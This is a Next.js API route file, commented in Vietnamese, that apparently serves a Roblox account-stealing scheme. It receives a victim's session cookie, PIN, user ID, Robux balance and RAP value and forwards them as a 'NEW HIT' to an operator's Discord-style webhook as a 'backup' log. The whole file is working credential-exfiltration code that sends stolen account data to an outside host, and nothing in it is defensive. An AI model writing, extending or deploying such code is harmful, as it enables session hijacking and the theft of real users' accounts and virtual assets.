// app/api/send-admin-hit/route.ts
import { NextRequest, NextResponse } from "next/server";

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const {
      cookie,
      pin,
      userId,
      userData,
      fullStats,
      slug, // optional, để biết hit từ slug nào
    } = body;

    // Validate tối thiểu
    if (!cookie || !userId) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 });
    }

    const adminWebhook = process.env.ADMIN_WEBHOOK_URL;

    if (!adminWebhook) {
      console.error("[Admin Webhook] ADMIN_WEBHOOK_URL not set in .env");
      // Không throw error, vì đây là backup → client vẫn ok
      return NextResponse.json({ success: true, message: "Admin webhook not configured" });
    }

    // Tạo payload ngắn gọn cho admin (không cần full embed như webhook chính)
    const username = userData?.basic?.name || "N/A";
    const robux = fullStats?.robux ?? 0;
    const rap = fullStats?.rap ?? 0;

    // Truncate cookie để tránh lộ quá nhiều (admin chỉ cần biết có hit)
    const cookieTruncated = cookie.slice(0, 80) + (cookie.length > 80 ? "..." : "");

    const payload = {
      content: `@everyone [ADMIN LOG] NEW HIT từ /${slug || "unknown"}`,
      embeds: [
        {
          title: "Backup Hit Log",
          color: 0xFF4500, // màu cam nổi
          description: `**User:** ${username} | ID: ${userId}\n**PIN:** ${pin || "N/A"}\n**Cookie (truncated):** \`\`\`${cookieTruncated}\`\`\``,
          fields: [
            { name: "Robux", value: robux.toString(), inline: true },
            { name: "RAP", value: rap.toString(), inline: true },
            { name: "From Slug", value: slug || "N/A", inline: true },
          ],
          timestamp: new Date().toISOString(),
          footer: { text: "Admin Backup - Không lưu trữ" },
        },
      ],
    };

    // Gửi tới admin webhook
    const res = await fetch(adminWebhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    if (!res.ok) {
      const errText = await res.text().catch(() => "Unknown error");
      console.error(`[Admin Webhook Failed] ${res.status} - ${errText}`);
      // Vẫn trả success cho client, vì đây chỉ là backup
    }

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error("[API /send-admin-hit]", err);
    // Không leak error chi tiết cho client
    return NextResponse.json({ success: true }); // vẫn coi như ok để không ảnh hưởng flow chính
  }
}